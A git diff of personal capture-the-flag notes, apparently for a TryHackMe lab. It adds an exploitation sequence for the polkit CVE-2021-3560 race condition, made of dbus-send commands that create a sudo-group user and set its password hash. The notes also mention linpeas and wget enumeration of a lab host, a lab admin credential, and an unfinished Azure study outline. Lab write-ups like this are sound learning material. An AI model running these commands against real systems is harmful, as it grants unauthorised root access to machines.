@@ -185,7 +185,7 @@ Login Here .. therefore
 ...`/realadmin`
 ![](realestadminloginpage.png)
 
-We are `realadmin@traverse.com : admin_key!!!` 
+We are ` realadmin@traverse.com : admin_key!!!` 
 ![](systemcmdunlocked.png)
 
 I now need to fuzz authenticated with all previous tools for sake of completeness. And to remeber how to do it... feel free to skip the the "Command parameter abuse..." section. 
@@ -260,7 +260,33 @@ $dbuser='phpmyadmin';
 
 - CVE-2021-3560 
 
-Polkit - I need to finish the https://tryhackme.com/room/polkit room and update my notes.
+Polkit - I needed to finish the https://tryhackme.com/room/polkit room and update my notes. 
+
+Exploitation Steps:
+```bash
+# Time the creation of a new user 
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+# Race condition to kill command half way through execution to create new user and add to sudo group
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.004s; kill $!
+# Check user has been created
+id attacker
+# Password hash creation for the hash used below 
+openssl passwd -6 Expl01ted
+# Set the password hash - beware of the UID of the newly created user in required in the fllow command
+UID="insert the affective user id for the newly created user in the command below"
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.004s; kill $!
+```
+
+Timing initially was 0.221s
+![](testthetimingofdbussend.png)
+
+Retesting the timing after failed attempt as the execution was much fast the second test
+![](retestingtiming.png)
+
+0.004 seconds!
+![](newusercreated.png)
+But no user gets created, I tried at various increments but all failed.
+
 #### Exfiltration
 
 Linpeas back to your machine for data collection fanatics like myself
@@ -295,13 +321,32 @@ wget -r http://10.10.233.101/
 #### Source Code Analysis
 
 
+
 #### Azure Application Services and App Service Plan  
 
 I am going for Azure exams soon so adding this here to justify doing the CTF even more...
 
-For the Azure App Service Plan
+- Create and configure Azure App Service
+- 
+	- Provision an App Service plan
+		- Requires a Resource group
+		
+	- Configure scaling for an App Service plan
+		- 
+	- Create an App Service
+		- Export the App Plan as an Azure Resource Manager (ARM) template
+	- Configure certificates and TLS for an App Service
+		- 
+	- Map an existing custom DNS name to an App Service
+		- 
+	- Configure backup for an App Service
+		- 
+	- Configure networking settings for an App Service
+		- 
+	- Configure deployment slots for an App Service
+		- 
 
 
-For Azure App Service
+
 
 
